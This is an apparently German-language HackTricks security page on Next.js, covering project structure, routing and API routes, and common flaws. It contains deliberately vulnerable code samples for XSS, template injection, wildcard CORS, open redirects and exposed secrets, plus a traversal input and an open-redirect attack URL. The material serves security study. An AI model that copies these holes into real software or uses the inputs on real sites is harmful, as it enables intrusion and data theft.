# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Allgemeine Architektur einer Next.js-Anwendung

### Typische Verzeichnisstruktur

Ein Standard-Next.js-Projekt folgt einer spezifischen Datei- und Verzeichnisstruktur, die Funktionen wie Routing, API-Endpunkte und die Verwaltung statischer Assets erleichtert. Hier ist ein typisches Layout:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Kernverzeichnisse und Dateien

- **public/:** Enthält statische Assets wie Bilder, Schriftarten und andere Dateien. Dateien hier sind am Root-Pfad (`/`) zugänglich.
- **app/:** Zentrales Verzeichnis für die Pages, Layouts, Komponenten und API-Routen deiner Anwendung. Nutzt das **App Router**-Paradigma und ermöglicht erweiterte Routing-Funktionen sowie die Trennung von Server- und Client-Komponenten.
- **app/layout.tsx:** Definiert das Root-Layout deiner Anwendung, umschließt alle Seiten und stellt konsistente UI-Elemente wie Header, Footer und Navigationsleisten bereit.
- **app/page.tsx:** Dient als Einstiegspunkt für die Root-Route `/` und rendert die Startseite.
- **app/[route]/page.tsx:** Behandelt statische und dynamische Routen. Jeder Ordner innerhalb von `app/` repräsentiert ein Routensegment, und die `page.tsx` in diesen Ordnern entspricht der Komponente der Route.
- **app/api/:** Enthält API-Routen und erlaubt das Erstellen von serverlosen Funktionen, die HTTP-Anfragen verarbeiten. Diese Routen ersetzen das traditionelle `pages/api`-Verzeichnis.
- **app/components/:** Beinhaltet wiederverwendbare React-Komponenten, die auf verschiedenen Seiten und Layouts verwendet werden können.
- **app/styles/:** Enthält globale CSS-Dateien und CSS Modules für komponentenspezifisches Styling.
- **app/utils/:** Beinhaltet Utility-Funktionen, Hilfs-Module und andere nicht-UI-Logik, die in der gesamten Anwendung geteilt werden können.
- **.env.local:** Speichert Umgebungsvariablen, die spezifisch für die lokale Entwicklungsumgebung sind. Diese Variablen werden **nicht** in die Versionskontrolle übernommen.
- **next.config.js:** Passt das Verhalten von Next.js an, einschließlich webpack-Konfigurationen, Umgebungsvariablen und Sicherheitseinstellungen.
- **tsconfig.json:** Konfiguriert TypeScript-Einstellungen für das Projekt und aktiviert Type-Checking sowie andere TypeScript-Funktionen.
- **package.json:** Verwaltet Projektabhängigkeiten, Skripte und Metadaten.
- **README.md:** Bietet Dokumentation und Informationen zum Projekt, einschließlich Installationsanweisungen, Nutzungsrichtlinien und anderen relevanten Details.
- **yarn.lock / package-lock.json:** Sperren die Abhängigkeiten des Projekts auf bestimmte Versionen und gewährleisten konsistente Installationen in verschiedenen Umgebungen.

## Client-seitig in Next.js

### Dateibasiertes Routing im `app`-Verzeichnis

Das `app`-Verzeichnis ist der Eckpfeiler des Routings in den neuesten Next.js-Versionen. Es nutzt das Dateisystem zur Definition von Routen, wodurch das Routing-Management intuitiv und skalierbar wird.

<details>

<summary>Behandlung des Root-Pfads /</summary>

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Wichtige Dateien:**

- **`app/page.tsx`**: Verarbeitet Anfragen an den Root-Pfad `/`.
- **`app/layout.tsx`**: Definiert das Layout der Anwendung und umschließt alle Seiten.

**Implementierung:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Erklärung:**

- **Routen-Definition:** Die Datei `page.tsx`, die sich direkt im Verzeichnis `app` befindet, entspricht der Route `/`.
- **Rendering:** Diese Komponente rendert den Inhalt für die Startseite.
- **Layout-Integration:** Die `HomePage`-Komponente wird von `layout.tsx` umschlossen, das Header, Footer und andere gemeinsame Elemente enthalten kann.

</details>

<details>

<summary>Umgang mit anderen statischen Pfaden</summary>

**Beispiel: `/about` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Erklärung:**

- **Routen-Definition:** Die Datei `page.tsx` im Ordner `about` entspricht der Route `/about`.
- **Rendering:** Diese Komponente rendert den Inhalt für die Seite `/about`.

</details>

<details>

<summary>Dynamische Routen</summary>

Dynamische Routen ermöglichen die Verarbeitung von Pfaden mit variablen Segmenten und erlauben es Anwendungen, Inhalte basierend auf Parametern wie IDs, Slugs usw. anzuzeigen.

**Beispiel: `/posts/[id]` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Erklärung:**

- **Dynamisches Segment:** `[id]` bezeichnet ein dynamisches Segment in der Route und erfasst den `id`-Parameter aus der URL.
- **Zugriff auf Parameter:** Das `params`-Objekt enthält die dynamischen Parameter und ist innerhalb der Komponente zugänglich.
- **Routenabgleich:** Jeder Pfad, der `/posts/*` entspricht, wie z. B. `/posts/1`, `/posts/abc` usw., wird von dieser Komponente verarbeitet.

</details>

<details>

<summary>Verschachtelte Routen</summary>

Next.js unterstützt verschachtelte Routen und erlaubt hierarchische Routing-Strukturen, die der Verzeichnisstruktur entsprechen.

**Beispiel: `/dashboard/settings/profile` Route**

**Dateistruktur:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Erklärung:**

- **Tiefe Verschachtelung:** Die Datei `page.tsx` innerhalb von `dashboard/settings/profile/` entspricht der Route `/dashboard/settings/profile`.
- **Hierarchieabbildung:** Die Verzeichnisstruktur spiegelt den URL-Pfad wider und verbessert die Wartbarkeit und Übersichtlichkeit.

</details>

<details>

<summary>Catch-All-Routen</summary>

Catch-All-Routen behandeln mehrere verschachtelte Segmente oder unbekannte Pfade und bieten Flexibilität bei der Routenverarbeitung.

**Beispiel: `/*` Route**

**Dateistruktur:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Implementierung:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Erklärung:**

- **Catch-All Segment:** `[...slug]` erfasst alle verbleibenden Pfadsegmente als Array.
- **Verwendung:** Nützlich zum Umgang mit dynamischen Routing-Szenarien wie benutzererstellten Pfaden, verschachtelten Kategorien usw.
- **Route Matching:** Pfade wie `/anything/here`, `/foo/bar/baz` usw. werden von dieser Komponente gehandhabt.

</details>

### Mögliche clientseitige Schwachstellen

While Next.js provides a secure foundation, improper coding practices can introduce vulnerabilities. Wichtige clientseitige Schwachstellen umfassen:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS-Angriffe treten auf, wenn bösartige Skripte in vertrauenswürdige Websites eingeschleust werden. Angreifer können Skripte im Browser der Benutzer ausführen, Daten stehlen oder Aktionen im Namen des Benutzers durchführen.

**Beispiel für verwundbaren Code:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Warum es verwundbar ist:** Die Verwendung von `dangerouslySetInnerHTML` mit nicht vertrauenswürdigen Eingaben erlaubt Angreifern, bösartige Skripte einzuschleusen.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Tritt auf, wenn Benutzereingaben in Templates unsachgemäß verarbeitet werden und Angreifern ermöglicht wird, Templates oder Ausdrücke einzuschleusen und auszuführen.

**Beispiel für verwundbaren Code:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Warum es verwundbar ist:** Wenn `template` oder `data` bösartigen Inhalt enthalten, kann dies zur Ausführung von unbeabsichtigtem Code führen.

</details>

<details>

<summary>Client Path Traversal</summary>

Es handelt sich um eine Schwachstelle, die es Angreifern ermöglicht, clientseitige Pfade zu manipulieren, um unbeabsichtigte Aktionen auszuführen, wie z. B. Cross-Site Request Forgery (CSRF). Im Gegensatz zur server-side path traversal, die das Dateisystem des Servers angreift, konzentriert sich CSPT darauf, clientseitige Mechanismen auszunutzen, um legitime API-Anfragen auf bösartige Endpunkte umzuleiten.

**Beispiel für verwundbaren Code:**

Eine Next.js-Anwendung erlaubt Benutzern, Dateien hoch- und herunterzuladen. Die Download-Funktion ist clientseitig implementiert, wobei Benutzer den Dateipfad angeben können, den sie herunterladen möchten.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Angriffsszenario

1. **Ziel des Angreifers**: Einen CSRF-Angriff durchführen, um eine kritische Datei (z. B. `admin/config.json`) zu löschen, indem `filePath` manipuliert wird.
2. **Exploiting CSPT**:
- **Bösartige Eingabe**: Der Angreifer erstellt eine URL mit einem manipulierten `filePath`, z. B. `../deleteFile/config.json`.
- **Resultierender API Call**: Der client-side Code macht eine Anfrage an `/api/files/../deleteFile/config.json`.
- **Server's Handling**: Wenn der server die `filePath`-Eingabe nicht validiert, verarbeitet er die Anfrage und kann dabei sensible Dateien löschen oder offenlegen.
3. **Ausführung von CSRF**:
- **Manipulierter Link**: Der Angreifer sendet dem Opfer einen Link oder bettet ein bösartiges Script ein, das die Download-Anfrage mit dem manipulierten `filePath` auslöst.
- **Ergebnis**: Das Opfer führt die Aktion unwissentlich aus, was zu unautorisiertem Datei-Zugriff oder -Löschen führt.

#### Warum es verwundbar ist

- **Fehlende Input-Validierung**: Die client-side erlaubt beliebige `filePath`-Eingaben, was Path Traversal ermöglicht.
- **Vertrauen in Client-Inputs**: Das server-side API vertraut und verarbeitet den `filePath` ohne Sanitization.
- **Mögliche API-Aktionen**: Wenn der API-Endpunkt zustandsändernde Aktionen durchführt (z. B. Dateien löschen oder ändern), kann er über CSPT ausgenutzt werden.

</details>

## Server-Side in Next.js

### Server-Side Rendering (SSR)

Pages are rendered on the server on each request, ensuring that the user receives fully rendered HTML. In this case you should create your own custom server to process the requests.

**Use Cases:**

- Dynamic content that changes frequently.
- SEO optimization, as search engines can crawl the fully rendered page.

**Implementation:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Statische Seitengenerierung (SSG)

Seiten werden zur Build-Zeit vorgerendert, was zu schnelleren Ladezeiten und verringerter Serverauslastung führt.

**Anwendungsfälle:**

- Inhalte, die sich nicht häufig ändern.
- Blogs, Dokumentation, Marketing-Seiten.

**Implementierung:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Serverless-Funktionen (API Routes)

Next.js ermöglicht die Erstellung von API-Endpunkten als Serverless-Funktionen. Diese Funktionen werden bei Bedarf ausgeführt, ohne dass ein dedizierter Server erforderlich ist.

**Anwendungsfälle:**

- Verarbeiten von Formularen.
- Interaktion mit Datenbanken.
- Verarbeiten von Daten oder Integration mit APIs von Drittanbietern.

**Implementierung:**

Mit der Einführung des `app`-Verzeichnisses in Next.js 13 sind Routing und API-Handling flexibler und leistungsfähiger geworden. Dieser moderne Ansatz steht in engem Einklang mit dem dateibasierten Routing-System, bringt jedoch erweiterte Möglichkeiten mit, einschließlich Unterstützung für Server- und Client-Komponenten.

#### Grundlegender Route-Handler

**Dateistruktur:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Erklärung:**

- **Ort:** API-Routen liegen im Verzeichnis `app/api/`.
- **Dateibenennung:** Jeder API-Endpunkt befindet sich in einem eigenen Ordner mit einer `route.js`- oder `route.ts`-Datei.
- **Exportierte Funktionen:** Statt eines einzigen `default`-Exports werden für konkrete HTTP-Methoden spezifische Funktionen (z. B. `GET`, `POST`) exportiert.
- **Response-Handling:** Verwende den `Response`-Konstruktor, um Antworten zurückzugeben, wodurch du mehr Kontrolle über Header und Statuscodes hast.

#### Umgang mit anderen Pfaden und Methoden:

<details>

<summary>Spezifische HTTP-Methoden behandeln</summary>

Next.js 13+ ermöglicht es, Handler für spezifische HTTP-Methoden in derselben `route.js`- oder `route.ts`-Datei zu definieren, was zu klarerem und besser organisiertem Code führt.

**Beispiel:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erklärung:**

- **Mehrere Exporte:** Jede HTTP-Methode (`GET`, `PUT`, `DELETE`) hat ihre eigene exportierte Funktion.
- **Parameter:** Das zweite Argument bietet Zugriff auf Routenparameter über `params`.
- **Erweiterte Antworten:** Mehr Kontrolle über Response-Objekte, wodurch eine präzise Verwaltung von Headern und Statuscodes möglich ist.

</details>

<details>

<summary>Catch-All- und verschachtelte Routen</summary>

Next.js 13+ unterstützt erweiterte Routing-Funktionen wie Catch-All-Routen und verschachtelte API-Routen, was dynamischere und skalierbarere API-Strukturen ermöglicht.

**Beispiel für eine Catch-All-Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Erklärung:**

- **Syntax:** `[...]` kennzeichnet ein Catch-all-Segment, das alle verschachtelten Pfade erfasst.
- **Verwendung:** Nützlich für APIs, die unterschiedliche Routen-Tiefen oder dynamische Segmente verarbeiten müssen.

**Beispiel für verschachtelte Routen:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Erklärung:**

- **Tiefes Verschachteln:** Ermöglicht hierarchische API-Strukturen, die Ressourcenbeziehungen widerspiegeln.
- **Zugriff auf Parameter:** Einfacher Zugriff auf mehrere Routenparameter über das `params`-Objekt.

</details>

<details>

<summary>Handling API routes in Next.js 12 and Earlier</summary>

## API-Routen im `pages`-Verzeichnis (Next.js 12 und älter)

Bevor Next.js 13 das `app`-Verzeichnis und erweiterte Routing-Funktionen einführte, wurden API-Routen hauptsächlich im `pages`-Verzeichnis definiert. Dieser Ansatz wird weiterhin häufig verwendet und in Next.js 12 und älteren Versionen unterstützt.

#### Grundlegende API-Route

**Dateistruktur:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Erklärung:**

- **Speicherort:** API routes liegen im Verzeichnis `pages/api/`.
- **Export:** Verwende `export default`, um die Handler-Funktion zu definieren.
- **Funktionssignatur:** Der Handler erhält die Objekte `req` (HTTP request) und `res` (HTTP response).
- **Routing:** Der Dateiname (`hello.js`) wird auf den Endpoint `/api/hello` abgebildet.

#### Dynamische API-Routen

**Dateistruktur:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Implementierung:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Erklärung:**

- **Dynamische Segmente:** Square brackets (`[id].js`) bezeichnen dynamische Route-Segmente.
- **Zugriff auf Parameter:** Verwende `req.query.id`, um auf den dynamischen Parameter zuzugreifen.
- **Verarbeiten von Methoden:** Verwende bedingte Logik, um verschiedene HTTP-Methoden (`GET`, `PUT`, `DELETE`, usw.) zu behandeln.

#### Verarbeiten verschiedener HTTP-Methoden

Während das grundlegende API-Route-Beispiel alle HTTP-Methoden in einer einzigen Funktion behandelt, kannst du deinen Code so strukturieren, dass jede Methode explizit behandelt wird, um bessere Übersichtlichkeit und Wartbarkeit zu erreichen.

**Beispiel:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Beste Praktiken:**

- **Trennung der Verantwortlichkeiten:** Trennen Sie die Logik eindeutig nach verschiedenen HTTP-Methoden.
- **Antwortkonsistenz:** Stellen Sie einheitliche Antwortstrukturen sicher, um die Client-seitige Verarbeitung zu erleichtern.
- **Fehlerbehandlung:** Fangen Sie nicht unterstützte Methoden und unerwartete Fehler ab und behandeln Sie sie angemessen.

</details>

### CORS-Konfiguration

Kontrollieren Sie, welche Ursprünge auf Ihre API-Routen zugreifen können, um Cross-Origin Resource Sharing (CORS)-Schwachstellen zu mindern.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Beachte, dass **CORS auch in allen API routes konfiguriert werden kann** in der **`middleware.ts`**-Datei:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Problem:**

- **`Access-Control-Allow-Origin: '*'`:** Erlaubt jeder Website den Zugriff auf die API, wodurch bösartige Seiten möglicherweise ohne Einschränkungen mit deiner API interagieren können.
- **Zu breite Methodenfreigabe:** Das Zulassen aller Methoden kann Angreifern ermöglichen, unerwünschte Aktionen durchzuführen.

**Wie Angreifer es ausnutzen:**

Angreifer können bösartige Websites erstellen, die Anfragen an deine API senden und dabei Funktionen wie Datenabruf, Datenmanipulation oder das Auslösen unerwünschter Aktionen im Namen authentifizierter Benutzer missbrauchen.

{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Offenlegung von Server-Code auf der Client-Seite

Es ist leicht möglich, **serverseitig verwendeten Code auch im clientseitig exponierten Code zu verwenden**. Der beste Weg, um sicherzustellen, dass eine Code-Datei niemals auf der Client-Seite exponiert wird, ist die Verwendung dieses Imports am Anfang der Datei:
```js
import "server-only"
```
## Wichtige Dateien und ihre Rollen

### `middleware.ts` / `middleware.js`

**Location:** Stammverzeichnis des Projekts oder innerhalb von `src/`.

**Purpose:** Führt Code in der server-side serverless function aus, bevor eine request verarbeitet wird, und ermöglicht Aufgaben wie authentication, redirects oder das Modifizieren von responses.

**Execution Flow:**

1. **Eingehender request:** Die middleware fängt die request ab.
2. **Verarbeitung:** Führt Operationen basierend auf der request aus (z. B. check authentication).
3. **Response-Modifikation:** Kann die response ändern oder die Kontrolle an den nächsten handler weitergeben.

**Example Use Cases:**

- Weiterleiten von unauthenticated users.
- Hinzufügen von custom headers.
- Logging von requests.

**Sample Configuration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### `next.config.js`

**Location:** Stammverzeichnis des Projekts.

**Purpose:** Konfiguriert das Verhalten von Next.js, aktiviert oder deaktiviert Features, passt webpack-Konfigurationen an, setzt Umgebungsvariablen und konfiguriert mehrere Sicherheitsfunktionen.

**Key Security Configurations:**

<details>

<summary>Security Headers</summary>

Sicherheits-Header verbessern die Sicherheit Ihrer Anwendung, indem sie Browser anweisen, wie Inhalte behandelt werden sollen. Sie helfen, verschiedene Angriffe wie Cross-Site Scripting (XSS), Clickjacking und MIME type sniffing zu mindern:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Beispiele:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Bildoptimierungseinstellungen</summary>

Next.js optimiert Bilder für die Performance, aber Fehlkonfigurationen können zu Sicherheitslücken führen, wie das Zulassen nicht vertrauenswürdiger Quellen zum Einschleusen bösartiger Inhalte.

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Problem:**

- **`'*'`:** Ermöglicht das Laden von Bildern aus beliebigen externen Quellen, einschließlich nicht vertrauenswürdiger oder bösartiger Domains. Angreifer können Bilder hosten, die bösartige payloads oder Inhalte enthalten, die Benutzer in die Irre führen.
- Ein weiteres Problem kann darin bestehen, eine Domain zuzulassen, auf der **jeder ein Bild hochladen kann** (wie `raw.githubusercontent.com`)

**Wie Angreifer es ausnutzen:**

Durch das Einbinden von Bildern aus bösartigen Quellen können Angreifer Phishing-Angriffe durchführen, irreführende Informationen anzeigen oder Schwachstellen in Bibliotheken zur Bilddarstellung ausnutzen.

</details>

<details>

<summary>Offenlegung von Umgebungsvariablen</summary>

Manage sensitive information like API keys and database credentials securely without exposing them to the client.

#### a. Offenlegung sensibler Variablen

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Problem:**

- **`SECRET_API_KEY`:** Ohne das `NEXT_PUBLIC_`-Präfix setzt Next.js Variablen nicht für den Client frei. Wird es jedoch versehentlich vorangestellt (z. B. `NEXT_PUBLIC_SECRET_API_KEY`), sind diese auf der Client-Seite zugänglich.

**Wie Angreifer es ausnutzen:**

Wenn sensible Variablen dem Client zugänglich sind, können Angreifer sie durch Inspektion des Client-Codes oder der Netzwerkrequests auslesen und dadurch unbefugten Zugriff auf APIs, Datenbanken oder andere Dienste erlangen.

</details>

<details>

<summary>Weiterleitungen</summary>

Verwalten Sie URL-Weiterleitungen und -Umschreibungen innerhalb Ihrer Anwendung, sodass Benutzer korrekt weitergeleitet werden, ohne open redirect vulnerabilities einzuführen.

#### a. Open Redirect Vulnerability

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Problem:**

- **Dynamic Destination:** Ermöglicht es Benutzern, jede beliebige URL anzugeben, wodurch open redirect attacks möglich werden.
- **Trusting User Input:** Weiterleitungen zu URLs, die von Benutzern ohne Validierung bereitgestellt werden, können zu phishing, malware distribution oder credential theft führen.

**How attackers abuse it:**

Angreifer können URLs erstellen, die so aussehen, als stammten sie von Ihrer Domain, aber Benutzer zu bösartigen Websites umleiten. Zum Beispiel:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Benutzer, die der ursprünglichen Domain vertrauen, könnten unwissentlich auf schädliche Websites gelangen.

</details>

<details>

<summary>Webpack-Konfiguration</summary>

Passe Webpack-Konfigurationen für deine Next.js-Anwendung an, was unbeabsichtigt Sicherheitslücken einführen kann, wenn es nicht vorsichtig gehandhabt wird.

#### a. Offenlegen sensibler Module

**Schlechtes Konfigurationsbeispiel:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Problem:**

- **Offenlegung sensibler Pfade:** Aliasing sensibler Verzeichnisse und das Zulassen von clientseitigem Zugriff können einen leak vertraulicher Informationen verursachen.
- **Bundling Secrets:** Wenn sensible Dateien für den Client gebündelt werden, werden ihre Inhalte über source maps oder durch Inspektion des clientseitigen Codes zugänglich.

**Wie Angreifer es ausnutzen:**

Angreifer können auf die Verzeichnisstruktur der Anwendung zugreifen oder sie rekonstruieren, wodurch sie potenziell sensible Dateien oder Daten finden und ausnutzen können.

</details>

### `pages/_app.js` und `pages/_document.js`

#### **`pages/_app.js`**

**Zweck:** Überschreibt die standardmäßige App-Komponente und erlaubt globalen State, Styles und Layout-Komponenten.

**Anwendungsfälle:**

- Globale CSS einbinden.
- Layout-Wrapper hinzufügen.
- State-Management-Bibliotheken integrieren.

**Beispiel:**
```jsx
// pages/_app.js
import "../styles/globals.css"

function MyApp({ Component, pageProps }) {
return <Component {...pageProps} />
}

export default MyApp
```
#### **`pages/_document.js`**

**Zweck:** Überschreibt das Standard-Document und ermöglicht die Anpassung der HTML- und Body-Tags.

**Anwendungsfälle:**

- Änderung der `<html>`- oder `<body>`-Tags.
- Hinzufügen von Meta-Tags oder benutzerdefinierten Skripten.
- Integration von Drittanbieter-Schriftarten.

**Beispiel:**
```jsx
// pages/_document.js
import Document, { Html, Head, Main, NextScript } from "next/document"

class MyDocument extends Document {
render() {
return (
<Html lang="en">
<Head>{/* Custom fonts or meta tags */}</Head>
<body>
<Main />
<NextScript />
</body>
</Html>
)
}
}

export default MyDocument
```
### Benutzerdefinierter Server (Optional)

